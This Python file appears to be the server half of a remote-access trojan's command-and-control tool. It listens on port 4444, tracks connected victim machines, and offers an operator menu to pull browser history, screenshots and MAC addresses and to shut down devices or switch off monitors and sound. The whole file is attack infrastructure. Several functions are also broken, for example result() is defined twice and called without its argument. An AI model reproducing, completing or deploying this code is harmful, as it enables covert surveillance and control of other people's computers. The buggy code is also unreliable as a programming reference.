from threading import Thread
import numpy as np
import socket
from datetime import datetime
import time
from PIL import Image
import os
import sys

LOCATION = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))

# ANSI COLORS
MAIN = '\001\033[38;5;85m\002'
GREEN = '\001\033[38;5;82m\002'
GRAY = PLOAD = '\001\033[38;5;246m\002'
NAME = '\001\033[38;5;228m\002'
RED = '\001\033[1;31m\002'
FAIL = '\001\033[1;91m\002'
ORANGE = '\033[0;38;5;214m\002'
LRED = '\033[0;38;5;202m\002'
BOLD = '\001\033[1m\002'
UNDERLINE = '\001\033[4m\002'
END = '\001\033[0m\002'

# LOG LEVELS
INFO = f'[{MAIN}Info{END}]'
WARNING = f'[{LRED}Warning{END}]'
IMPORTANT = f'[{ORANGE}Important{END}]'
FAILING = f'[{RED}Fail{END}]'
DEBUG = f'[{ORANGE}Debug{END}]'
SUCCESS = f'[{GREEN}SUCCESS{END}]'

HOST = socket.gethostbyname(socket.gethostname())
PORT = 4444
ADDR = (HOST, PORT)

client_store = {}
# {
#     "id": {
#         "address": ('client address'),
#         "socket": 'socket',
#         "commands": ['list of commands']
#     }
# }

class CCA_SERVER:
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def result(self, client):
        client.send(command.encode())
        result_output = client.recv(1024).decode()
        print(result_output)

    def banner(self):
        print(
            FAIL
            + r'''
________/\\\\\\\\\________/\\\\\\\\\_____/\\\\\\\\\____        
 _____/\\\////////______/\\\////////____/\\\\\\\\\\\\\__       
  ___/\\\/_____________/\\\/____________/\\\/////////\\\_      
   __/\\\______________/\\\_____________\/\\\_______\/\\\_     
    _\/\\\_____________\/\\\_____________\/\\\\\\\\\\\\\\\_    
     _\//\\\____________\//\\\____________\/\\\/////////\\\_   
      __\///\\\___________\///\\\__________\/\\\_______\/\\\_  
       ____\////\\\\\\\\\____\////\\\\\\\\\_\/\\\_______\/\\\_ 
        _______\/////////________\/////////__\///________\///__
                                             by HamzaDLM
'''
            + END
            + '''
        Type help to see available commands!
'''
        )

    def list_commands(self):
        print(
            r'''

        List of commands:

        **** INFORMATION ****
        - help        : GET ALL AVAILABLE COMMANDS
        - mac         : GET MACHINE'S MAC ADDRESS
        - history     : GET BROWSER HISTORY (LAST 20)
        - scrn        : GET SCREENSHOT OF CURRENT SESSION

        **** CONTROL ****
        - killc       : DISCONNECT CLIENT
        - quit        : DISCONNECT SERVER
        - shutdown    : SHUTDOWN THE CLIENT'S DEVICE
        - voloff      : TURN VOLUME TO 0%
        - volon       : TURN VOLUME TO 100%
        - monoff      : TURN MONITOR OFF
        - monon       : TURN MONITOR ON

        '''
        )

    def list_client_commands(self):
        print(
            r'''

        List of client specific commands:

        **** INFORMATION ****
        - help        : GET ALL AVAILABLE COMMANDS
        - mac         : GET MACHINE'S MAC ADDRESS
        - history     : GET BROWSER HISTORY (LAST 20)
        - scrn        : GET SCREENSHOT OF CURRENT SESSION

        **** CONTROL ****
        - killc       : DISCONNECT CLIENT
        - quit        : DISCONNECT SERVER
        - shutdown    : SHUTDOWN THE CLIENT'S DEVICE
        - voloff      : TURN VOLUME TO 0%
        - volon       : TURN VOLUME TO 100%
        - monoff      : TURN MONITOR OFF
        - monon       : TURN MONITOR ON

        '''
        )

    def execute_commands(self):
        global current_client # all or id of client
        current_client = None
        while True:
            global command

            if current_client:
                command = input(f'> connected to {current_client} > ')
                client_store[current_client]['commands'].append(command)
            else:
                command = input('> ')

                if 'help' in command:
                    self.list_commands()

                elif 'list' in command:
                    print(f'{"ID":<8} {"HOST":<15} {"PORT":<10} {"MAC":<20} {"SYSTEM":<20}')
                    if client_store:
                        for k, v in client_store.items():
                            addr = v['address']
                            print(f'{k:<8} {addr[0]:<15} {addr[1]:<10} {"N/A":<20} {"N/A":<20}')
                    else:
                        print('No devices connected to host')
                        
                elif 'connect' in command:
                    parse = command.split(' ')
                    current_client = parse[-1]

                elif current_client and 'quit' in command:
                    current_client = None 

                else:
                    print(f"{WARNING}: {command} is not a valid command!")

    def result(self, client):
        client.send(command.encode())
        result_output = client.recv(1024).decode()
        print(result_output)

    def handle_client(self, client_id):
        print(f"\n{INFO} Connected to: {client_store[client_id]['address']}")
        while True:
            c = client_store[client_id]['commands']
            s = client_store[client_id]['socket']
            if len(c) > 0:
                for com in c:
                    # TREAT COMMANDS COMING TO CLIENT AND REMOVE THEM
                    
                    if 'help' in com:
                        self.list_client_commands()

                    elif 'mac' in com:
                        self.result()
                    
                    elif 'shutdown' in com:
                        self.result()
                    
                    elif 'volon' in com:
                        self.result()

                    elif 'voloff' in com:
                        self.result()

                    elif 'monon' in com:
                        self.result()
                    
                    elif 'monoff' in com:
                        self.result()

                    elif 'killc' in com:
                        self.result()
                    
                    c.remove(com)

            time.sleep(0.1)
        # data = client_socket.recv(1024).decode()
        # print(data)

    # def commandParse(self, command):
    #     pass


    def main(self):
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.bind(ADDR)
        except socket.error as err:
            print(f'{FAILING}: Socket creation failed: {err}')
            sys.exit()
        server_socket.listen(20)
        commands_thread = Thread(target=self.execute_commands)
        commands_thread.start()
        while True:
            client_socket, client_address = server_socket.accept()
            client_id = str(len(client_store)+1)
            client_store[client_id] = {
                'address': client_address,
                'socket': client_socket,
                'commands': []
            }
            client_thread = Thread(target=self.handle_client, args=(client_id,))
            client_thread.start()


if __name__ == "__main__":
    server = CCA_SERVER(HOST, PORT)
    server.banner()
    server.main()
